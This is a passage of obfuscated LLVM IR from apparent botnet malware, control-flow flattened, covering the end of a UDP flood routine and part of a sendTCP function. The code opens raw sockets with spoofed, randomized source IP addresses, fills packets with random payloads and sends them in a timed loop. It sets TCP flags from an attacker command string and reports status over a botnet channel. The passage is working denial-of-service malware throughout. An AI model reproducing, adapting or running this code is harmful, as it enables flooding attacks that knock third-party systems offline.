  %135 = icmp ne i32 %134, 0
  %136 = select i1 %135, i32 1313705492, i32 2140476186
  store i32 %136, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i32, i32* @switchCommStock, align 4
  %139 = call i32 (i32, i8*, ...) @botnetPrint(i32 %138, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.114, i32 0, i32 0))
  store i32 1209456446, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  store i32 1, i32* %25, align 4
  %141 = load i32, i32* %24, align 4
  %142 = bitcast i32* %25 to i8*
  %143 = call i32 @setsockopt(i32 %141, i32 0, i32 3, i8* %142, i32 4) #3
  %144 = icmp slt i32 %143, 0
  %145 = select i1 %144, i32 1544888025, i32 -309781231
  store i32 %145, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* @switchCommStock, align 4
  %148 = call i32 (i32, i8*, ...) @botnetPrint(i32 %147, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.115, i32 0, i32 0))
  store i32 1209456446, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  store i32 50, i32* %26, align 4
  store i32 -1384237397, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i32, i32* %26, align 4
  %152 = add nsw i32 %151, -1
  store i32 %152, i32* %26, align 4
  %153 = icmp ne i32 %151, 0
  %154 = select i1 %153, i32 -1314350953, i32 -69938598
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = call i64 @time(i64* null) #3
  %157 = call i32 @rand_cmwc()
  %158 = zext i32 %157 to i64
  %159 = xor i64 %156, %158
  %160 = trunc i64 %159 to i32
  call void @srand(i32 %160) #3
  %161 = call i32 @rand() #3
  call void @init_rand(i32 %161)
  store i32 -1384237397, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i32, i32* %12, align 4
  %164 = icmp eq i32 %163, 0
  %165 = select i1 %164, i32 -601347927, i32 -853631636
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  store i32 0, i32* %27, align 4
  store i32 -964261314, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  %168 = load i32, i32* %12, align 4
  %169 = sub nsw i32 32, %168
  %170 = shl i32 1, %169
  %171 = sub nsw i32 %170, 1
  %172 = xor i32 %171, -1
  store i32 %172, i32* %27, align 4
  store i32 -964261314, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i32, i32* %13, align 4
  %175 = sext i32 %174 to i64
  %176 = add i64 28, %175
  store i64 %176, i64* %.reg2mem2
  %177 = call i8* @llvm.stacksave()
  store i8* %177, i8** %28, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %178 = alloca i8, i64 %.reload4, align 16
  store i8* %178, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %179 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %179, %struct.iphdr** %29, align 8
  %180 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %181 = bitcast %struct.iphdr* %180 to i8*
  %182 = getelementptr i8, i8* %181, i64 20
  %183 = bitcast i8* %182 to %struct.udphdr*
  store %struct.udphdr* %183, %struct.udphdr** %30, align 8
  %184 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %186 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %185, i32 0, i32 0
  %187 = load i32, i32* %186, align 4
  %188 = load i32, i32* %27, align 4
  %189 = call i32 @GRIP(i32 %188)
  %190 = call i32 @htonl(i32 %189) #10
  %191 = load i32, i32* %13, align 4
  %192 = sext i32 %191 to i64
  %193 = add i64 8, %192
  %194 = trunc i64 %193 to i32
  call void @makeIPPacket(%struct.iphdr* %184, i32 %187, i32 %190, i8 zeroext 17, i32 %194)
  %195 = load i32, i32* %13, align 4
  %196 = sext i32 %195 to i64
  %197 = add i64 8, %196
  %198 = trunc i64 %197 to i16
  %199 = call zeroext i16 @htons(i16 zeroext %198) #10
  %200 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.1* %201 to %struct.anon.2*
  %203 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %202, i32 0, i32 2
  store i16 %199, i16* %203, align 2
  %204 = call i32 @rand_cmwc()
  %205 = trunc i32 %204 to i16
  %206 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %207 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %206, i32 0, i32 0
  %208 = bitcast %union.anon.1* %207 to %struct.anon.2*
  %209 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %208, i32 0, i32 0
  store i16 %205, i16* %209, align 2
  %210 = load i32, i32* %10, align 4
  %211 = icmp eq i32 %210, 0
  %212 = select i1 %211, i32 -1338402030, i32 -625462971
  store i32 %212, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = call i32 @rand_cmwc()
  store i32 -1810942503, i32* %switchVar
  store i32 %214, i32* %.reg2mem10
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = load i32, i32* %10, align 4
  %217 = trunc i32 %216 to i16
  %218 = call zeroext i16 @htons(i16 zeroext %217) #10
  %219 = zext i16 %218 to i32
  store i32 -1810942503, i32* %switchVar
  store i32 %219, i32* %.reg2mem10
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %221 = trunc i32 %.reload11 to i16
  %222 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %223 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %222, i32 0, i32 0
  %224 = bitcast %union.anon.1* %223 to %struct.anon.2*
  %225 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %224, i32 0, i32 1
  store i16 %221, i16* %225, align 2
  %226 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %227 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon.1* %227 to %struct.anon.2*
  %229 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %228, i32 0, i32 3
  store i16 0, i16* %229, align 2
  %230 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %231 = bitcast %struct.udphdr* %230 to i8*
  %232 = getelementptr inbounds i8, i8* %231, i64 8
  %233 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %232, i32 %233)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %234 = bitcast i8* %.reload8 to i16*
  %235 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 2
  %237 = load i16, i16* %236, align 2
  %238 = zext i16 %237 to i32
  %239 = call zeroext i16 @csum(i16* %234, i32 %238)
  %240 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 7
  store i16 %239, i16* %241, align 2
  %242 = call i64 @time(i64* null) #3
  %243 = load i32, i32* %11, align 4
  %244 = sext i32 %243 to i64
  %245 = add nsw i64 %242, %244
  %246 = trunc i64 %245 to i32
  store i32 %246, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  store i32 679095313, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  store i32 1244028375, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = load i32, i32* %24, align 4
  %250 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %251 = call i64 @sendto(i32 %249, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %250, i32 16)
  %252 = call i32 @rand_cmwc()
  %253 = trunc i32 %252 to i16
  %254 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %255 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %254, i32 0, i32 0
  %256 = bitcast %union.anon.1* %255 to %struct.anon.2*
  %257 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %256, i32 0, i32 0
  store i16 %253, i16* %257, align 2
  %258 = load i32, i32* %10, align 4
  %259 = icmp eq i32 %258, 0
  %260 = select i1 %259, i32 1947671217, i32 225417681
  store i32 %260, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = call i32 @rand_cmwc()
  store i32 -1380736289, i32* %switchVar
  store i32 %262, i32* %.reg2mem12
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i32, i32* %10, align 4
  %265 = trunc i32 %264 to i16
  %266 = call zeroext i16 @htons(i16 zeroext %265) #10
  %267 = zext i16 %266 to i32
  store i32 -1380736289, i32* %switchVar
  store i32 %267, i32* %.reg2mem12
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %269 = trunc i32 %.reload13 to i16
  %270 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %271 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %270, i32 0, i32 0
  %272 = bitcast %union.anon.1* %271 to %struct.anon.2*
  %273 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %272, i32 0, i32 1
  store i16 %269, i16* %273, align 2
  %274 = call i32 @rand_cmwc()
  %275 = trunc i32 %274 to i16
  %276 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 3
  store i16 %275, i16* %277, align 4
  %278 = load i32, i32* %27, align 4
  %279 = call i32 @GRIP(i32 %278)
  %280 = call i32 @htonl(i32 %279) #10
  %281 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 8
  store i32 %280, i32* %282, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %283 = bitcast i8* %.reload6 to i16*
  %284 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 2
  %286 = load i16, i16* %285, align 2
  %287 = zext i16 %286 to i32
  %288 = call zeroext i16 @csum(i16* %283, i32 %287)
  %289 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 7
  store i16 %288, i16* %290, align 2
  %291 = load i32, i32* %32, align 4
  %292 = load i32, i32* %18, align 4
  %293 = icmp eq i32 %291, %292
  %294 = select i1 %293, i32 -926615963, i32 230598538
  store i32 %294, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = call i64 @time(i64* null) #3
  %297 = load i32, i32* %31, align 4
  %298 = sext i32 %297 to i64
  %299 = icmp sgt i64 %296, %298
  %300 = select i1 %299, i32 -589261806, i32 -379237973
  store i32 %300, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  store i32 935387703, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  store i32 0, i32* %32, align 4
  store i32 679095313, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i32, i32* %32, align 4
  %305 = add i32 %304, 1
  store i32 %305, i32* %32, align 4
  %306 = load i32, i32* %33, align 4
  %307 = load i32, i32* %15, align 4
  %308 = icmp eq i32 %306, %307
  %309 = select i1 %308, i32 -73098363, i32 -1214565096
  store i32 %309, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  %311 = load i32, i32* %16, align 4
  %312 = mul nsw i32 %311, 1000
  %313 = call i32 @usleep(i32 %312)
  store i32 0, i32* %33, align 4
  store i32 679095313, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load i32, i32* %33, align 4
  %316 = add i32 %315, 1
  store i32 %316, i32* %33, align 4
  store i32 679095313, i32* %switchVar
  br label %loopEnd

; <label>:317:                                    ; preds = %loopEntry
  %318 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %318)
  store i32 1209456446, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %317, %314, %310, %303, %302, %301, %295, %268, %263, %261, %248, %247, %220, %215, %213, %173, %167, %166, %162, %155, %150, %149, %146, %140, %137, %132, %131, %128, %124, %117, %116, %115, %109, %105, %101, %90, %78, %77, %69, %66, %61, %54, %53, %47, %42, %38, %first, %switchDefault
  br label %loopEntry
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

declare i32 @usleep(i32) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -478688026, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -478688026, label %first
    i32 27078962, label %31
    i32 -114886067, label %35
    i32 -981633924, label %40
    i32 -349326722, label %46
    i32 -633718781, label %47
    i32 889174581, label %54
    i32 1089389029, label %57
    i32 307287427, label %63
    i32 695450837, label %66
    i32 -716843728, label %70
    i32 -1598612272, label %71
    i32 1519897443, label %77
    i32 307260284, label %125
    i32 731989626, label %161
    i32 -489909740, label %164
    i32 -2074697003, label %168
    i32 -1921579372, label %173
    i32 -1988458664, label %181
    i32 -29046798, label %186
    i32 -1062876922, label %194
    i32 981079896, label %199
    i32 -1935613622, label %207
    i32 1401931162, label %212
    i32 2076551448, label %220
    i32 -1742875975, label %225
    i32 -2037122596, label %233
    i32 -2073298281, label %237
    i32 -267350149, label %238
    i32 -123020536, label %239
    i32 1082913859, label %240
    i32 -817295389, label %241
    i32 2103952694, label %243
    i32 483626097, label %244
    i32 348853203, label %262
    i32 879207992, label %264
    i32 -867303469, label %269
    i32 1540094023, label %295
    i32 1685443831, label %296
    i32 -896456347, label %343
    i32 1582882965, label %349
    i32 873656869, label %350
    i32 1800433241, label %351
    i32 1961018904, label %354
    i32 -1715774196, label %356
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 27078962, i32 -114886067
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 -981633924, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #10
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 -981633924, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 -349326722, i32 -633718781
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -1715774196, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #3
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 1089389029, i32 889174581
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* @switchCommStock, align 4
  %56 = call i32 (i32, i8*, ...) @botnetPrint(i32 %55, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.114, i32 0, i32 0))
  store i32 -1715774196, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %58 = load i32, i32* %17, align 4
  %59 = bitcast i32* %18 to i8*
  %60 = call i32 @setsockopt(i32 %58, i32 0, i32 3, i8* %59, i32 4) #3
  %61 = icmp slt i32 %60, 0
  %62 = select i1 %61, i32 307287427, i32 695450837
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* @switchCommStock, align 4
  %65 = call i32 (i32, i8*, ...) @botnetPrint(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.115, i32 0, i32 0))
  store i32 -1715774196, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %11, align 4
  %68 = icmp eq i32 %67, 0
  %69 = select i1 %68, i32 -716843728, i32 -1598612272
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 1519897443, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %11, align 4
  %73 = sub nsw i32 32, %72
  %74 = shl i32 1, %73
  %75 = sub nsw i32 %74, 1
  %76 = xor i32 %75, -1
  store i32 %76, i32* %19, align 4
  store i32 1519897443, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %13, align 4
  %79 = sext i32 %78 to i64
  %80 = add i64 40, %79
  store i64 %80, i64* %.reg2mem2
  %81 = call i8* @llvm.stacksave()
  store i8* %81, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %82 = alloca i8, i64 %.reload4, align 16
  store i8* %82, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %83 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %83, %struct.iphdr** %21, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = bitcast %struct.iphdr* %84 to i8*
  %86 = getelementptr i8, i8* %85, i64 20
  %87 = bitcast i8* %86 to %struct.tcphdr*
  store %struct.tcphdr* %87, %struct.tcphdr** %22, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %90 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 4
  %92 = load i32, i32* %19, align 4
  %93 = call i32 @GRIP(i32 %92)
  %94 = call i32 @htonl(i32 %93) #10
  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = add i64 20, %96
  %98 = trunc i64 %97 to i32
  call void @makeIPPacket(%struct.iphdr* %88, i32 %91, i32 %94, i8 zeroext 6, i32 %98)
  %99 = call i32 @rand_cmwc()
  %100 = trunc i32 %99 to i16
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon* %102 to %struct.anon.0*
  %104 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %103, i32 0, i32 0
  store i16 %100, i16* %104, align 4
  %105 = call i32 @rand_cmwc()
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon* %107 to %struct.anon.0*
  %109 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %108, i32 0, i32 2
  store i32 %105, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon* %111 to %struct.anon.0*
  %113 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %112, i32 0, i32 3
  store i32 0, i32* %113, align 4
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon* %115 to %struct.anon.0*
  %117 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %116, i32 0, i32 4
  %118 = load i16, i16* %117, align 4
  %119 = and i16 %118, -241
  %120 = or i16 %119, 80
  store i16 %120, i16* %117, align 4
  %121 = load i8*, i8** %12, align 8
  %122 = call i32 @strcmp(i8* %121, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.116, i32 0, i32 0)) #9
  %123 = icmp ne i32 %122, 0
  %124 = select i1 %123, i32 731989626, i32 307260284
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %127 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon* %127 to %struct.anon.0*
  %129 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %128, i32 0, i32 4
  %130 = load i16, i16* %129, align 4
  %131 = and i16 %130, -513
  %132 = or i16 %131, 512
  store i16 %132, i16* %129, align 4
  %133 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  %135 = bitcast %union.anon* %134 to %struct.anon.0*
  %136 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %135, i32 0, i32 4
  %137 = load i16, i16* %136, align 4
  %138 = and i16 %137, -1025
  %139 = or i16 %138, 1024
  store i16 %139, i16* %136, align 4
  %140 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 0
  %142 = bitcast %union.anon* %141 to %struct.anon.0*
  %143 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %142, i32 0, i32 4
  %144 = load i16, i16* %143, align 4
  %145 = and i16 %144, -257
  %146 = or i16 %145, 256
  store i16 %146, i16* %143, align 4
  %147 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %148 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %147, i32 0, i32 0
  %149 = bitcast %union.anon* %148 to %struct.anon.0*
  %150 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %149, i32 0, i32 4
  %151 = load i16, i16* %150, align 4
  %152 = and i16 %151, -4097
  %153 = or i16 %152, 4096
  store i16 %153, i16* %150, align 4
  %154 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon* %155 to %struct.anon.0*
  %157 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %156, i32 0, i32 4
  %158 = load i16, i16* %157, align 4
  %159 = and i16 %158, -2049
  %160 = or i16 %159, 2048
  store i16 %160, i16* %157, align 4
  store i32 483626097, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i8*, i8** %12, align 8
  %163 = call i8* @strtok(i8* %162, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %163, i8** %23, align 8
  store i32 -489909740, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = icmp ne i8* %165, null
  %167 = select i1 %166, i32 -2074697003, i32 2103952694
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i8*, i8** %23, align 8
  %170 = call i32 @strcmp(i8* %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.118, i32 0, i32 0)) #9
  %171 = icmp ne i32 %170, 0
  %172 = select i1 %171, i32 -1988458664, i32 -1921579372
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon* %175 to %struct.anon.0*
  %177 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -513
  %180 = or i16 %179, 512
  store i16 %180, i16* %177, align 4
  store i32 -817295389, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i8*, i8** %23, align 8
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.119, i32 0, i32 0)) #9
  %184 = icmp ne i32 %183, 0
  %185 = select i1 %184, i32 -1062876922, i32 -29046798
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon* %188 to %struct.anon.0*
  %190 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = and i16 %191, -1025
  %193 = or i16 %192, 1024
  store i16 %193, i16* %190, align 4
  store i32 1082913859, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8*, i8** %23, align 8
  %196 = call i32 @strcmp(i8* %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.120, i32 0, i32 0)) #9
  %197 = icmp ne i32 %196, 0
  %198 = select i1 %197, i32 -1935613622, i32 981079896
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon* %201 to %struct.anon.0*
  %203 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -257
  %206 = or i16 %205, 256
  store i16 %206, i16* %203, align 4
  store i32 -123020536, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %23, align 8
  %209 = call i32 @strcmp(i8* %208, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.121, i32 0, i32 0)) #9
  %210 = icmp ne i32 %209, 0
  %211 = select i1 %210, i32 2076551448, i32 1401931162
  store i32 %211, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon* %214 to %struct.anon.0*
  %216 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %215, i32 0, i32 4
  %217 = load i16, i16* %216, align 4
  %218 = and i16 %217, -4097
  %219 = or i16 %218, 4096
  store i16 %219, i16* %216, align 4
  store i32 -267350149, i32* %switchVar
